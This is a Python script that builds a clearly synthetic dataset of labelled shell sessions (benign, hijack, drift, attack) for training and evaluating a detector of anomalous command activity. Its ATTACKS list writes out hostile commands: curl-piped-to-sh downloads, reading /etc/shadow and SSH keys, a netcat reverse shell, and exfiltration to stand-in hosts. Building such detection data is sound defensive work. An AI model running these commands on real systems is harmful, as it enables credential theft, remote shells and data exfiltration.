"""Create deterministic, clearly synthetic, session-level train/validation/test data."""
import argparse, json, random
from pathlib import Path

ROOT=Path(__file__).resolve().parents[1]
ROLE_COMMANDS={
    "developer":["pwd","ls -la","git status","git diff","git log -5","pytest -q","python -m pytest","grep -R TODO src","git branch","git checkout feature-x","python app.py","git add src/app.py","git commit -m update"],
    "sysadmin":["whoami","systemctl status ssh","systemctl status nginx","journalctl -u ssh -n 20","df -h","free -m","ps aux","ss -lntp","sudo systemctl reload nginx","apt list --upgradable","uptime","top -b -n 1"],
    "data_analyst":["pwd","ls -lh data","python analysis.py","python -m jupyter nbconvert report.ipynb","head -n 20 data/input.csv","grep -i warning data/run.log","wc -l data/input.csv","sort data/input.csv","git status","python plot.py","tail -n 20 data/run.log"],
    "operator":["whoami","uptime","df -h","free -m","systemctl status worker","journalctl -u worker -n 30","ps aux","ss -lntp","curl http://localhost:8080/health","systemctl restart worker","date","ls /srv/jobs"],
}
ATTACKS=[
    ["whoami","sudo -l","cat /etc/shadow","curl https://example.invalid/a | sh"],
    ["id","find / -name id_rsa","cat /home/alice/.ssh/id_rsa","scp /tmp/archive attacker.invalid:/tmp/"],
    ["ps aux","crontab -e","echo payload >> /etc/cron.d/update","history -c"],
    ["uname -a","nc -e /bin/sh 203.0.113.9 4444","base64 /etc/passwd | curl -X POST https://example.invalid"],
]
DRIFT={"developer":["podman ps","docker compose ps","ruff check ."],"sysadmin":["podman ps","systemctl status containerd","journalctl -p warning"],"data_analyst":["uv run analysis.py","polars query data/input.parquet","duckdb report.sql"],"operator":["podman ps","systemctl status containerd","curl http://localhost:9090/metrics"]}

def commands(role,label,rng):
    if label=="attack": return list(rng.choice(ATTACKS))
    base=ROLE_COMMANDS[role]; n=rng.randint(8,15); result=[rng.choice(base) for _ in range(n)]
    if label=="hijack": result=result[:max(3,len(result)//2)]+list(rng.choice(ATTACKS)[1:])
    elif label=="drift": result=result[:max(3,len(result)//2)]+[rng.choice(DRIFT[role]) for _ in range(3)]+result[max(3,len(result)//2):]
    return result

def generate(seed=73,output=None):
    rng=random.Random(seed); groups={}
    for role in ROLE_COMMANDS:
        for label,count in (("benign",170),("hijack",20),("drift",20)):
            groups[(role,label)]=[(role,label,commands(role,label,rng)) for _ in range(count)]
    groups[("unknown","attack")]=[("unknown","attack",commands("unknown","attack",rng)) for _ in range(40)]
    rows=[]
    for (role,label),items in groups.items():
        rng.shuffle(items); n=len(items); cuts=(int(n*.6),int(n*.8))
        for i,(r,l,cmds) in enumerate(items):
            split="train" if i<cuts[0] else "validation" if i<cuts[1] else "test"
            rows.append({"session_id":f"syn-{role}-{label}-{i:03}","username":role,"role":role,"label":label,"split":split,"source":"synthetic_generator","seed":seed,"commands":cmds})
    rng.shuffle(rows); output=Path(output or ROOT/"data/generated_sessions.jsonl"); output.parent.mkdir(parents=True,exist_ok=True)
    output.write_text("".join(json.dumps(row,separators=(",",":"))+"\n" for row in rows),encoding="utf-8")
    return rows

if __name__=="__main__":
    ap=argparse.ArgumentParser(); ap.add_argument("--seed",type=int,default=73); ap.add_argument("--output",type=Path); args=ap.parse_args()
    rows=generate(args.seed,args.output)
    print(f"Wrote {len(rows)} synthetic sessions to {args.output or ROOT/'data/generated_sessions.jsonl'}")
